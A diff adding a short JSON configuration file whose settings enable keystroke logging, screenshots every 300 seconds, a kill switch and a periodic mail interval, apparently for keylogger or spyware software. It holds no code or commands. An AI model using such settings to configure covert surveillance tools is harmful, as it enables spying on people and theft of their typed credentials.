@@ -1,0 +1,8 @@
+{
+    "TimeBetweenEachScreenshot": 300,
+    "LogKeys": true,
+    "LogScreen": true,
+    "Logging": true,
+    "EnableKillSwitch": true,
+    "persistentMailInterval": 120
+}
